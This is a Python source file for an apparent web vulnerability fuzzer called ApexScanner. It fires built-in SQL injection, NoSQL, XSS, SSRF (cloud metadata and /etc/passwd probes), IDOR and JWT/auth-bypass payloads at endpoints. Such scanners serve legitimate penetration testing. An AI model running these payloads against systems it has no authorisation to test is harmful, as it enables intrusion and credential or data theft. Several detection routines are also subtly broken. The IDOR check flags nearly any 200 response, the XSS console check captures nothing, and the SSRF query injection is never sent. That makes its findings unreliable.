"""
ApexScanner - Multi-Vector Fuzzing Engine
OWASP Top 10 Hardcore: SQLi, NoSQLi, XSS, IDOR/BOLA, SSRF, Broken Auth
"""
import asyncio
import json
import time
import random
import string
import hashlib
from typing import Dict, List, Optional, Any, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import logging
import re
import httpx

try:
    from playwright.async_api import Page
except ImportError:
    pass

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Vulnerability types"""
    SQL_INJECTION = "sql_injection"
    NOSQL_INJECTION = "nosql_injection"
    XSS = "xss"
    IDOR = "idor"
    BOLA = "bola"
    SSRF = "ssrf"
    AUTH_BYPASS = "auth_bypass"
    RATE_LIMIT = "rate_limit"
    BROKEN_AUTH = "broken_auth"


class Severity(Enum):
    """Vulnerability severity"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class Vulnerability:
    """Discovered vulnerability"""
    id: str
    type: VulnerabilityType
    severity: Severity
    url: str
    endpoint: str
    parameter: str
    payload: str
    evidence: str
    request: Dict[str, Any]
    response: Dict[str, Any]
    confidence: float
    cwe_id: List[str]
    timestamp: float = field(default_factory=time.time)
    verification_status: str = "pending"  # pending, verified, false_positive
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'id': self.id,
            'type': self.type.value,
            'severity': self.severity.value,
            'url': self.url,
            'endpoint': self.endpoint,
            'parameter': self.parameter,
            'payload': self.payload[:500],
            'evidence': self.evidence[:1000],
            'confidence': self.confidence,
            'cwe_id': self.cwe_id,
            'verification_status': self.verification_status,
            'timestamp': self.timestamp
        }


class PayloadLibrary:
    """Payload library for all vulnerability types"""
    
    # SQL Injection payloads
    SQLI_PAYLOADS = [
        # Auth bypass
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR ''='",
        "admin'--",
        "' OR 1=1#",
        
        # Error-based
        "'",
        "''",
        "'\"",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        
        # Time-based
        "' AND SLEEP(5)--",
        "' AND PG_SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        
        # Polyglot
        "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
    ]
    
    # NoSQL Injection payloads
    NOSQLI_PAYLOADS = [
        # MongoDB operators
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$lt": ""}',
        '{"$or": [{"$ne": 1}, {"$ne": 2}]}',
        
        # JSON injection
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"user": {"$regex": "^adm"}}',
        
        # Operator injection
        '{"$where": "this.username == \'admin\'"}',
        '{"$where": "sleep(100)"}',
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        # Basic
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        
        # Event handlers
        "\" onmouseover=\"alert(1)\"",
        "' onfocus='alert(1)' autofocus",
        "<div oncopy=alert(1)>copy</div>",
        
        # DOM-based
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        
        # Bypass techniques
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        
        # Angular/React
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
    ]
    
    # IDOR/BOLA payloads
    IDOR_PAYLOADS = [
        # Sequential IDs
        "1", "2", "3", "100", "999",
        
        # UUID patterns
        "00000000-0000-0000-0000-000000000000",
        "ffffffff-ffff-ffff-ffff-ffffffffffff",
        
        # Common user IDs
        "admin", "root", "administrator", "test", "user",
        
        # Parameter manipulation
        "../", "..%2f", "%2e%2e/",
    ]
    
    # SSRF payloads
    SSRF_PAYLOADS = [
        # Internal IPs
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",  # AWS metadata
        "http://192.168.0.1",
        "http://10.0.0.1",
        
        # Protocol-based
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/",
        "gopher://127.0.0.1:6379/_INFO",
        
        # DNS rebinding
        "http://localhost.com",
        "http://127.1",
        
        # With ports
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:5432",
    ]
    
    # Auth bypass payloads
    AUTH_BYPASS_PAYLOADS = [
        # Password reset bypass
        {"email": "admin@juice-sh.op'--"},
        {"email": "user@juice-sh.op' OR '1'='1"},
        
        # JWT manipulation
        {"token": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."},
        {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30."},
        
        # Session fixation
        {"session_id": "0000000000000000"},
        {"session_id": "admin"},
    ]
    
    @classmethod
    def get_payloads(cls, vuln_type: VulnerabilityType) -> List[Any]:
        """Get payloads for vulnerability type"""
        mapping = {
            VulnerabilityType.SQL_INJECTION: cls.SQLI_PAYLOADS,
            VulnerabilityType.NOSQL_INJECTION: cls.NOSQLI_PAYLOADS,
            VulnerabilityType.XSS: cls.XSS_PAYLOADS,
            VulnerabilityType.IDOR: cls.IDOR_PAYLOADS,
            VulnerabilityType.BOLA: cls.IDOR_PAYLOADS,
            VulnerabilityType.SSRF: cls.SSRF_PAYLOADS,
            VulnerabilityType.AUTH_BYPASS: cls.AUTH_BYPASS_PAYLOADS,
        }
        return mapping.get(vuln_type, [])


class MultiVectorFuzzer:
    """
    Multi-vector fuzzing engine
    Tests endpoints against OWASP Top 10 vulnerabilities
    """
    
    def __init__(
        self,
        page: Optional['Page'] = None,
        http_client: Optional[httpx.AsyncClient] = None,
        timeout: int = 30000,
        max_concurrency: int = 5,
        oast_server: str = ""  # interact.sh server
    ):
        self.page = page
        self.http_client = http_client
        self.timeout = timeout
        self.max_concurrency = max_concurrency
        self.oast_server = oast_server
        
        # Semaphore for concurrency control
        self._semaphore = asyncio.Semaphore(max_concurrency)
        
        # Storage
        self._vulnerabilities: List[Vulnerability] = []
        self._tested_endpoints: Set[str] = set()
        
        # Statistics
        self._stats = {
            'requests_made': 0,
            'vulnerabilities_found': 0,
            'by_type': {},
            'by_severity': {}
        }
        
        # Payload library
        self.payload_lib = PayloadLibrary()
        
        # HTTP client setup
        if not self.http_client:
            self.http_client = httpx.AsyncClient(
                timeout=timeout / 1000,
                follow_redirects=False,
                verify=False
            )
    
    async def fuzz_endpoint(self, request_data: Dict[str, Any]) -> List[Vulnerability]:
        """
        Fuzz a single endpoint with all vectors
        """
        async with self._semaphore:
            vulnerabilities = []
            
            url = request_data.get('url', '')
            method = request_data.get('method', 'GET')
            headers = request_data.get('headers', {})
            body_json = request_data.get('body_json', {})
            query_params = request_data.get('query_params', {})
            
            # Skip if already tested
            endpoint_key = f"{method}:{url}"
            if endpoint_key in self._tested_endpoints:
                return []
            
            self._tested_endpoints.add(endpoint_key)
            
            logger.info(f"Fuzzing: {method} {url}")
            
            # Test each vulnerability type
            tasks = []
            
            # SQL Injection
            if body_json or query_params:
                tasks.append(self._test_sqli(url, method, headers, body_json, query_params))
            
            # NoSQL Injection
            if body_json:
                tasks.append(self._test_nosqli(url, method, headers, body_json))
            
            # XSS
            if method == 'GET' and query_params:
                tasks.append(self._test_xss_get(url, method, headers, query_params))
            if body_json:
                tasks.append(self._test_xss_post(url, method, headers, body_json))
            
            # IDOR/BOLA
            if self._has_id_parameter(url, body_json, query_params):
                tasks.append(self._test_idor(url, method, headers, body_json, query_params))
            
            # SSRF
            if self._has_url_parameter(body_json, query_params):
                tasks.append(self._test_ssrf(url, method, headers, body_json, query_params))
            
            # Auth bypass
            if self._is_auth_endpoint(url):
                tasks.append(self._test_auth_bypass(url, method, headers, body_json))
            
            # Execute all tests
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    vulnerabilities.extend(result)
                elif isinstance(result, Exception):
                    logger.error(f"Fuzzing error: {result}")
            
            # Update stats
            for vuln in vulnerabilities:
                self._vulnerabilities.append(vuln)
                self._stats['vulnerabilities_found'] += 1
                
                vuln_type = vuln.type.value
                self._stats['by_type'][vuln_type] = self._stats['by_type'].get(vuln_type, 0) + 1
                
                severity = vuln.severity.value
                self._stats['by_severity'][severity] = self._stats['by_severity'].get(severity, 0) + 1
            
            return vulnerabilities
    
    async def _test_sqli(
        self,
        url: str,
        method: str,
        headers: Dict,
        body_json: Dict,
        query_params: Dict
    ) -> List[Vulnerability]:
        """Test for SQL Injection"""
        vulnerabilities = []
        
        # Test in query parameters
        for param, value in query_params.items():
            for payload in self.payload_lib.SQLI_PAYLOADS[:10]:
                vuln = await self._inject_and_test(
                    url=url,
                    method=method,
                    headers=headers,
                    injection_type="sqli",
                    parameter=param,
                    payload=payload,
                    original_value=value,
                    location="query"
                )
                if vuln:
                    vulnerabilities.append(vuln)
                    break  # Found vuln, move to next param
        
        # Test in JSON body
        for field, value in body_json.items():
            if isinstance(value, str):
                for payload in self.payload_lib.SQLI_PAYLOADS[:10]:
                    vuln = await self._inject_and_test(
                        url=url,
                        method=method,
                        headers=headers,
                        injection_type="sqli",
                        parameter=field,
                        payload=payload,
                        original_value=value,
                        location="body"
                    )
                    if vuln:
                        vulnerabilities.append(vuln)
                        break
        
        return vulnerabilities
    
    async def _test_nosqli(
        self,
        url: str,
        method: str,
        headers: Dict,
        body_json: Dict
    ) -> List[Vulnerability]:
        """Test for NoSQL Injection"""
        vulnerabilities = []
        
        for field in body_json.keys():
            for payload in self.payload_lib.NOSQLI_PAYLOADS:
                try:
                    # Create modified body with NoSQL payload
                    test_body = body_json.copy()
                    test_body[field] = json.loads(payload) if payload.startswith('{') else payload
                    
                    response = await self._send_request(
                        url=url,
                        method=method,
                        headers=headers,
                        json_body=test_body
                    )
                    
                    # Check for success indicators
                    if response and response.status_code == 200:
                        resp_json = response.json() if response.content else {}
                        
                        # Auth bypass detection
                        if 'token' in str(resp_json).lower() or 'user' in str(resp_json).lower():
                            vuln = Vulnerability(
                                id=self._generate_vuln_id(),
                                type=VulnerabilityType.NOSQL_INJECTION,
                                severity=Severity.CRITICAL,
                                url=url,
                                endpoint=url,
                                parameter=field,
                                payload=payload,
                                evidence="NoSQL injection successful - authentication bypassed",
                                request={'method': method, 'body': test_body},
                                response={'status': response.status_code, 'body': response.text[:500]},
                                confidence=0.9,
                                cwe_id=["CWE-943"]
                            )
                            vulnerabilities.append(vuln)
                            break
                    
                except Exception as e:
                    logger.debug(f"NoSQLi test error: {e}")
        
        return vulnerabilities
    
    async def _test_xss_get(
        self,
        url: str,
        method: str,
        headers: Dict,
        query_params: Dict
    ) -> List[Vulnerability]:
        """Test for XSS in GET parameters"""
        vulnerabilities = []
        
        if not self.page:
            return vulnerabilities  # Need browser for XSS testing
        
        for param in query_params.keys():
            for payload in self.payload_lib.XSS_PAYLOADS[:15]:
                try:
                    # Build test URL
                    test_params = query_params.copy()
                    test_params[param] = payload
                    test_url = f"{url.split('?')[0]}?{self._build_query_string(test_params)}"
                    
                    # Navigate and check for execution
                    await self.page.goto(test_url, wait_until="domcontentloaded", timeout=10000)
                    
                    # Check for payload execution
                    executed = await self._check_xss_execution(payload)
                    
                    if executed:
                        vuln = Vulnerability(
                            id=self._generate_vuln_id(),
                            type=VulnerabilityType.XSS,
                            severity=Severity.HIGH,
                            url=test_url,
                            endpoint=url,
                            parameter=param,
                            payload=payload,
                            evidence="XSS payload executed in browser",
                            request={'method': method, 'url': test_url},
                            response={'status': 200},
                            confidence=0.95,
                            cwe_id=["CWE-79"]
                        )
                        vulnerabilities.append(vuln)
                        break
                    
                except Exception as e:
                    logger.debug(f"XSS GET test error: {e}")
        
        return vulnerabilities
    
    async def _test_xss_post(
        self,
        url: str,
        method: str,
        headers: Dict,
        body_json: Dict
    ) -> List[Vulnerability]:
        """Test for XSS in POST body"""
        vulnerabilities = []
        
        for field, value in body_json.items():
            if isinstance(value, str):
                for payload in self.payload_lib.XSS_PAYLOADS[:15]:
                    try:
                        test_body = body_json.copy()
                        test_body[field] = payload
                        
                        if self.page:
                            # Use browser
                            result = await self.page.evaluate(f"""
                                async () => {{
                                    try {{
                                        const response = await fetch('{url}', {{
                                            method: '{method}',
                                            headers: {{ 'Content-Type': 'application/json' }},
                                            body: JSON.stringify({json.dumps(test_body)})
                                        }});
                                        return {{
                                            status: response.status,
                                            body: await response.text()
                                        }};
                                    }} catch (e) {{
                                        return {{ error: e.message }};
                                    }}
                                }}
                            """)
                            
                            # Check if payload reflected and executed
                            if result.get('body') and payload in result.get('body', ''):
                                # Check for execution
                                executed = await self._check_xss_execution(payload)
                                
                                if executed:
                                    vuln = Vulnerability(
                                        id=self._generate_vuln_id(),
                                        type=VulnerabilityType.XSS,
                                        severity=Severity.HIGH,
                                        url=url,
                                        endpoint=url,
                                        parameter=field,
                                        payload=payload,
                                        evidence="XSS payload reflected and executed",
                                        request={'method': method, 'body': test_body},
                                        response={'status': result.get('status'), 'body': result.get('body', '')[:500]},
                                        confidence=0.9,
                                        cwe_id=["CWE-79"]
                                    )
                                    vulnerabilities.append(vuln)
                                    break
                    
                    except Exception as e:
                        logger.debug(f"XSS POST test error: {e}")
        
        return vulnerabilities
    
    async def _test_idor(
        self,
        url: str,
        method: str,
        headers: Dict,
        body_json: Dict,
        query_params: Dict
    ) -> List[Vulnerability]:
        """Test for IDOR/BOLA"""
        vulnerabilities = []
        
        # Extract original ID
        original_id = self._extract_id_from_request(url, body_json, query_params)
        if not original_id:
            return vulnerabilities
        
        # Test with different IDs
        for test_id in ["1", "2", "999", "admin"]:
            try:
                # Modify request with test ID
                modified = self._replace_id_in_request(url, body_json, query_params, original_id, test_id)
                test_url, test_body, test_params = modified
                
                # Send request
                response = await self._send_request(
                    url=test_url,
                    method=method,
                    headers=headers,
                    json_body=test_body,
                    params=test_params
                )
                
                # Check if we can access other user's data
                if response and response.status_code == 200:
                    # Simple heuristic: different ID returns different data
                    if test_id != original_id:
                        vuln = Vulnerability(
                            id=self._generate_vuln_id(),
                            type=VulnerabilityType.IDOR,
                            severity=Severity.HIGH,
                            url=url,
                            endpoint=url,
                            parameter="id",
                            payload=f"ID changed from {original_id} to {test_id}",
                            evidence=f"Accessed resource with ID {test_id} (original: {original_id})",
                            request={'method': method, 'test_id': test_id},
                            response={'status': response.status_code, 'body': response.text[:500]},
                            confidence=0.7,
                            cwe_id=["CWE-639"]
                        )
                        vulnerabilities.append(vuln)
                        break
                
            except Exception as e:
                logger.debug(f"IDOR test error: {e}")
        
        return vulnerabilities
    
    async def _test_ssrf(
        self,
        url: str,
        method: str,
        headers: Dict,
        body_json: Dict,
        query_params: Dict
    ) -> List[Vulnerability]:
        """Test for SSRF"""
        vulnerabilities = []
        
        # Find URL parameters
        url_params = self._find_url_parameters(body_json, query_params)
        
        for param in url_params:
            for payload in self.payload_lib.SSRF_PAYLOADS[:10]:
                try:
                    # Inject SSRF payload
                    if param in body_json:
                        test_body = body_json.copy()
                        test_body[param] = payload
                    else:
                        test_body = body_json
                        test_params = query_params.copy()
                        test_params[param] = payload
                    
                    # Send request with timeout (SSRF often causes delays)
                    start_time = time.time()
                    response = await self._send_request(
                        url=url,
                        method=method,
                        headers=headers,
                        json_body=test_body if 'test_body' in dir() else body_json,
                        timeout=10  # Short timeout for SSRF
                    )
                    elapsed = time.time() - start_time
                    
                    # Check for SSRF indicators
                    if response:
                        # Error messages mentioning internal services
                        if any(x in response.text.lower() for x in ['connection refused', 'internal', 'localhost', '127.0.0.1']):
                            vuln = Vulnerability(
                                id=self._generate_vuln_id(),
                                type=VulnerabilityType.SSRF,
                                severity=Severity.CRITICAL,
                                url=url,
                                endpoint=url,
                                parameter=param,
                                payload=payload,
                                evidence=f"SSRF detected - internal service response (time: {elapsed:.2f}s)",
                                request={'method': method, 'payload': payload},
                                response={'status': response.status_code, 'body': response.text[:500]},
                                confidence=0.8,
                                cwe_id=["CWE-918"]
                            )
                            vulnerabilities.append(vuln)
                            break
                    
                except Exception as e:
                    logger.debug(f"SSRF test error: {e}")
        
        return vulnerabilities
    
    async def _test_auth_bypass(
        self,
        url: str,
        method: str,
        headers: Dict,
        body_json: Dict
    ) -> List[Vulnerability]:
        """Test for authentication bypass"""
        vulnerabilities = []
        
        for payload in self.payload_lib.AUTH_BYPASS_PAYLOADS:
            try:
                # Merge payload with original body
                test_body = {**body_json, **payload}
                
                response = await self._send_request(
                    url=url,
                    method=method,
                    headers=headers,
                    json_body=test_body
                )
                
                if response and response.status_code == 200:
                    try:
                        resp_json = response.json() if response.content else {}
                        
                        # Check for auth success indicators
                        if any(indicator in str(resp_json).lower() for indicator in ['token', 'jwt', 'session', 'authenticated']):
                            vuln = Vulnerability(
                                id=self._generate_vuln_id(),
                                type=VulnerabilityType.AUTH_BYPASS,
                                severity=Severity.CRITICAL,
                                url=url,
                                endpoint=url,
                                parameter=list(payload.keys())[0],
                                payload=str(payload),
                                evidence="Authentication bypassed with special payload",
                                request={'method': method, 'body': test_body},
                                response={'status': response.status_code, 'body': response.text[:500]},
                                confidence=0.85,
                                cwe_id=["CWE-287", "CWE-306"]
                            )
                            vulnerabilities.append(vuln)
                            break
                    
                    except:
                        pass
                
            except Exception as e:
                logger.debug(f"Auth bypass test error: {e}")
        
        return vulnerabilities
    
    async def _inject_and_test(
        self,
        url: str,
        method: str,
        headers: Dict,
        injection_type: str,
        parameter: str,
        payload: str,
        original_value: Any,
        location: str
    ) -> Optional[Vulnerability]:
        """Generic injection test"""
        try:
            # Create modified request
            if location == "query":
                test_params = {parameter: payload}
                test_url = f"{url.split('?')[0]}?{self._build_query_string(test_params)}"
                response = await self._send_request(url=test_url, method=method, headers=headers)
            else:
                test_body = {parameter: payload}
                response = await self._send_request(url=url, method=method, headers=headers, json_body=test_body)
            
            if not response:
                return None
            
            # Check for SQL error patterns
            sql_errors = [
                'SQL syntax', 'MySQL', 'PostgreSQL', 'Oracle', 'SQLServer',
                'SQLite', 'PDOException', 'syntax error', 'unclosed quotation'
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    return Vulnerability(
                        id=self._generate_vuln_id(),
                        type=VulnerabilityType.SQL_INJECTION,
                        severity=Severity.CRITICAL,
                        url=url,
                        endpoint=url,
                        parameter=parameter,
                        payload=payload,
                        evidence=f"SQL error pattern detected: {error}",
                        request={'method': method, 'payload': payload},
                        response={'status': response.status_code, 'body': response.text[:500]},
                        confidence=0.9,
                        cwe_id=["CWE-89"]
                    )
            
            # Check for auth bypass (200 OK with token)
            if response.status_code == 200:
                try:
                    resp_json = response.json() if response.content else {}
                    if 'token' in str(resp_json).lower() or 'authentication' in str(resp_json).lower():
                        return Vulnerability(
                            id=self._generate_vuln_id(),
                            type=VulnerabilityType.SQL_INJECTION,
                            severity=Severity.CRITICAL,
                            url=url,
                            endpoint=url,
                            parameter=parameter,
                            payload=payload,
                            evidence="SQL injection - authentication bypassed",
                            request={'method': method, 'payload': payload},
                            response={'status': response.status_code, 'body': response.text[:500]},
                            confidence=0.95,
                            cwe_id=["CWE-89", "CWE-287"]
                        )
                except:
                    pass
            
        except Exception as e:
            logger.debug(f"Injection test error: {e}")
        
        return None
    
    async def _check_xss_execution(self, payload: str) -> bool:
        """Check if XSS payload was executed in browser"""
        try:
            # Check for common execution indicators
            indicators = [
                lambda: self.page.evaluate("window.alerted"),  # Custom marker
                lambda: self.page.evaluate("document.title").startswith("XSS"),  # Title change
                lambda: self.page.query_selector('img[src="x"]'),  # Injected elements
            ]
            
            for indicator in indicators:
                try:
                    result = await indicator()
                    if result:
                        return True
                except:
                    continue
            
            # Check console for alerts
            console_messages = await self.page.evaluate("""
                () => {
                    const messages = [];
                    const originalLog = console.log;
                    console.log = (...args) => {
                        messages.push(args.join(' '));
                        originalLog.apply(console, args);
                    };
                    return messages;
                }
            """)
            
            if any('alert' in str(msg).lower() or '1' in str(msg) for msg in console_messages):
                return True
            
        except Exception as e:
            logger.debug(f"XSS execution check error: {e}")
        
        return False
    
    async def _send_request(
        self,
        url: str,
        method: str = "GET",
        headers: Dict = None,
        json_body: Dict = None,
        params: Dict = None,
        timeout: int = 30
    ) -> Optional[httpx.Response]:
        """Send HTTP request"""
        try:
            self._stats['requests_made'] += 1
            
            response = await self.http_client.request(
                method=method,
                url=url,
                headers=headers or {},
                json=json_body,
                params=params,
                timeout=timeout
            )
            
            return response
            
        except Exception as e:
            logger.debug(f"HTTP request error: {e}")
            return None
    
    def _generate_vuln_id(self) -> str:
        """Generate unique vulnerability ID"""
        return f"vuln_{int(time.time() * 1000)}_{random.randint(1000, 9999)}"
    
    def _build_query_string(self, params: Dict) -> str:
        """Build query string from dict"""
        return "&".join(f"{k}={v}" for k, v in params.items())
    
    def _has_id_parameter(self, url: str, body_json: Dict, query_params: Dict) -> bool:
        """Check if request has ID parameter"""
        id_patterns = ['id', 'user_id', 'account_id', 'order_id', 'uuid', 'oid']
        all_params = str(url) + str(body_json) + str(query_params)
        return any(pattern in all_params.lower() for pattern in id_patterns)
    
    def _has_url_parameter(self, body_json: Dict, query_params: Dict) -> bool:
        """Check if request has URL parameter"""
        url_patterns = ['url', 'uri', 'path', 'redirect', 'next', 'return', 'image', 'src']
        all_params = list(body_json.keys()) + list(query_params.keys())
        return any(pattern in all_params for pattern in url_patterns)
    
    def _is_auth_endpoint(self, url: str) -> bool:
        """Check if URL is an authentication endpoint"""
        auth_patterns = ['login', 'auth', 'signin', 'session', 'token', 'oauth']
        return any(pattern in url.lower() for pattern in auth_patterns)
    
    def _extract_id_from_request(self, url: str, body_json: Dict, query_params: Dict) -> Optional[str]:
        """Extract ID value from request"""
        # Check URL path
        import re
        path_ids = re.findall(r'/(\d+)', url)
        if path_ids:
            return path_ids[0]
        
        # Check parameters
        all_params = {**body_json, **query_params}
        for key in ['id', 'user_id', 'userId', 'uid']:
            if key in all_params:
                return str(all_params[key])
        
        return None
    
    def _replace_id_in_request(
        self,
        url: str,
        body_json: Dict,
        query_params: Dict,
        original_id: str,
        new_id: str
    ) -> Tuple[str, Dict, Dict]:
        """Replace ID in request"""
        import re
        
        # Replace in URL
        new_url = re.sub(rf'/{re.escape(original_id)}', f'/{new_id}', url)
        
        # Replace in body
        new_body = body_json.copy()
        for key in list(new_body.keys()):
            if 'id' in key.lower() and str(new_body[key]) == original_id:
                new_body[key] = new_id
        
        # Replace in params
        new_params = query_params.copy()
        for key in list(new_params.keys()):
            if 'id' in key.lower() and str(new_params[key]) == original_id:
                new_params[key] = new_id
        
        return new_url, new_body, new_params
    
    def _find_url_parameters(self, body_json: Dict, query_params: Dict) -> List[str]:
        """Find parameters that likely contain URLs"""
        url_params = []
        all_params = {**body_json, **query_params}
        
        for key, value in all_params.items():
            key_lower = key.lower()
            if any(pattern in key_lower for pattern in ['url', 'uri', 'path', 'redirect', 'image', 'src']):
                url_params.append(key)
            elif isinstance(value, str) and value.startswith(('http://', 'https://', '/')):
                url_params.append(key)
        
        return url_params
    
    def get_vulnerabilities(self) -> List[Vulnerability]:
        """Get all discovered vulnerabilities"""
        return self._vulnerabilities
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get fuzzing statistics"""
        return self._stats


if __name__ == "__main__":
    print("ApexScanner Multi-Vector Fuzzing Engine loaded")
